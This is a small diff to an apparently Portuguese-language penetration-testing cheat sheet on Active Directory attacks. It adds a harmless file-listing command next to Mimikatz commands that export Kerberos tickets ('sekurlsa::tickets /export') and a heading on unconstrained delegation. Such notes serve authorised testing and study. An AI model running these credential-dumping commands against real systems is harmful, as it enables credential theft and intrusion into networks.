@@ -1357,6 +1357,9 @@ sekurlsa::tickets /export
 ```
 Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
 ```
+```
+ls | select name
+```
 ##### UNCONSTRAINED DELEGATION MIMIKATZ - VERIFICAR QUEM ESTÁ LOGADO EM UMA MÁQUINA / ONDE UM USUARIO ESTÁ LOGADO
 AGUARDAR ALGUM USUARIO SE CONECTAR E FICAR MONITORANDO (OPTIONAL) (PRECISA DE ALGUM TIPO DE ADMIN)
 ```
